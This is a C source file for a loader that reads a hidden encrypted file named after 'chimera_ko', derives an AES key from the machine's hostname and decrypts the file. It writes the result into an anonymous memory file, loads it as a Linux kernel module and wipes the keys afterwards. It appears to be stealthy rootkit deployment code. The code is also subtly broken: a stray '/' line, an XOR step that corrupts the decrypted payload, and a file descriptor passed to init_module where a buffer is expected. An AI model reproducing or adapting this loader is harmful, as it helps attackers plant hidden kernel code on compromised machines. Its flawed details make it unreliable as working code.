#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <openssl/aes.h>
#include <openssl/rand.h>

#define AES_KEY_SIZE   32
#define AES_BLOCK_SIZE 16
#define MEMFD_NAME     ".chimera_mmap"

static unsigned char deploy_key[AES_KEY_SIZE];
static unsigned char deploy_iv[AES_BLOCK_SIZE];

static void zero_mem(void *p, size_t len)
{
    volatile unsigned char *vp = (unsigned char *)p;
    while (len--)
        *vp++ = 0;
}

static int aes_decrypt(const unsigned char *in, size_t in_len,
                       unsigned char **out, size_t *out_len)
{
    AES_KEY dec_key;
    unsigned char *buf;
    int pad_bytes, plain_len;

    if (in_len == 0 || in_len % AES_BLOCK_SIZE != 0)
        return -1;

    buf = malloc(in_len);
    if (!buf)
        return -1;

    AES_set_decrypt_key(deploy_key, 256, &dec_key);
    AES_cbc_encrypt(in, buf, in_len, &dec_key, deploy_iv, AES_DECRYPT);

    pad_bytes = buf[in_len - 1];
    if (pad_bytes < 1 || pad_bytes > AES_BLOCK_SIZE)
        goto err;

    for (int i = 0; i < pad_bytes; i++) {
        if (buf[in_len - 1 - i] != pad_bytes)
            goto err;
    }

    plain_len = in_len - pad_bytes;
    *out = buf;
    *out_len = plain_len;
    return 0;

err:
    zero_mem(buf, in_len);
    free(buf);
    return -1;
}

static void poly_xor_shift(unsigned char *buf, size_t len,
                           unsigned char *key, unsigned int *shift)
{
    for (size_t i = 0; i < len; i++) {
        unsigned char kb = key[i % AES_KEY_SIZE];
        unsigned char sb = (unsigned char)((*shift >> ((i % 32) & 0x1F)) & 0xFF);
        buf[i] ^= kb ^ sb;
    }
    *shift ^= *shift << 13;
    *shift ^= *shift >> 17;
    *shift ^= *shift << 5;
}

int main(int argc, char *argv[])
{
    const char *enc_path = "/tmp/.chimera_ko.enc";
    unsigned char *enc_data = NULL, *dec_data = NULL;
    size_t enc_len, dec_len;
    int memfd;
    unsigned int poly_shift;

    if (argc > 1)
        enc_path = argv[1];

    FILE *f = fopen(enc_path, "rb");
    if (!f)
        return 1;

    fseek(f, 0, SEEK_END);
    enc_len = ftell(f);
    fseek(f, 0, SEEK_SET);

    enc_data = malloc(enc_len);
    if (!enc_data) {
        fclose(f);
        return 1;
    }

    if (fread(enc_data, 1, enc_len, f) != enc_len) {
        fclose(f);
        free(enc_data);
        return 1;
    }
    fclose(f);

    char hostname[65] = {0};
    gethostname(hostname, sizeof(hostname) - 1);
    for (int i = 0; i < AES_KEY_SIZE; i++)
        deploy_key[i] = (hostname[i % strlen(hostname)] ^ (i * 0x37)) & 0xFF;
    memset(deploy_iv, 0x42, AES_BLOCK_SIZE);

    if (aes_decrypt(enc_data, enc_len, &dec_data, &dec_len) != 0) {
        free(enc_data);
        return 1;
    }
/
    RAND_bytes((unsigned char *)&poly_shift, sizeof(poly_shift));
    poly_xor_shift(dec_data, dec_len, deploy_key, &poly_shift);

    zero_mem(enc_data, enc_len);
    free(enc_data);

    memfd = syscall(SYS_memfd_create, MEMFD_NAME, MFD_CLOEXEC);
    if (memfd < 0) {
        zero_mem(dec_data, dec_len);
        free(dec_data);
        return 1;
    }

    write(memfd, dec_data, dec_len);
    zero_mem(dec_data, dec_len);
    free(dec_data);

    lseek(memfd, 0, SEEK_SET);
    if (syscall(SYS_init_module, memfd, dec_len, "") != 0) {
        close(memfd);
        return 1;
    }

    close(memfd);

    /* Wipe all key material */
    zero_mem(deploy_key, sizeof(deploy_key));
    zero_mem(deploy_iv, sizeof(deploy_iv));

    return 0;
}
